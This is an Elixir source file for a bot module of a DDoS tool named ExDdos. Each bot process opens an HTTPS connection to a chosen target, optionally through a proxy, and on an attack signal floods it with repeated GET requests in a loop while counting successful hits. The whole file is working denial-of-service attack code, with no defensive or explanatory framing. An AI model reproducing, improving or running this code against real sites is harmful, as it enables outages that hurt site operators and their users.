defmodule ExDdos.Bot do
  use GenServer, restart: :transient

  require Logger

  def start_link(args), do: GenServer.start_link(__MODULE__, args)

  @impl true
  def init(args) do
    {:ok, _} = Registry.register(BotRegistry, "bots", [])

    loop()

    {:ok, %{conn: nil, attack?: false}, {:continue, args}}
  end

  @impl true
  def handle_continue({target}, state) do
    {:ok, conn} = Mint.HTTP.connect(:https, target, 443)

    {:noreply, %{state | conn: conn}}
  end

  def handle_continue({target, proxy, proxy_port}, state) do
    case Mint.HTTP.connect(:https, target, 443,
           proxy: {:http, proxy, proxy_port, []},
           timeout: :infinity
         ) do
      {:ok, conn} ->
        {:noreply, %{state | conn: conn}}

      err ->
        Logger.warning("proxy conn failed with #{inspect(err)}")
        exit(:normal)
    end
  end

  @impl true
  def handle_info(:loop, %{attack?: true, conn: conn} = state) do
    {:ok, conn, _ref} = Mint.HTTP.request(conn, "GET", "/", [], nil)

    {:noreply, %{state | conn: conn}}
  end

  def handle_info(:loop, state), do: {:noreply, state}

  def handle_info({:set_attack, true}, state) do
    loop()

    {:noreply, %{state | attack?: true}}
  end

  def handle_info({:set_attack, _}, state), do: {:noreply, %{state | attack?: false}}

  def handle_info(message, state) do
    case Mint.HTTP.stream(state.conn, message) do
      :unknown ->
        _ = Logger.error(fn -> "Received unknown message: " <> inspect(message) end)
        exit(:normal)

      {:ok, conn, [{:status, _, status} | _]} ->
        Logger.info("status - #{status}")
        Cachex.incr(:counts, "success_req_count", 1)
        loop()
        {:noreply, %{state | conn: conn}}

      {:ok, conn, _} ->
        loop()
        {:noreply, %{state | conn: conn}}

      {:error, _conn, err, _} ->
        Logger.error(inspect(err))
        exit(:normal)
    end
  end

  defp loop, do: Process.send(self(), :loop, [])
end
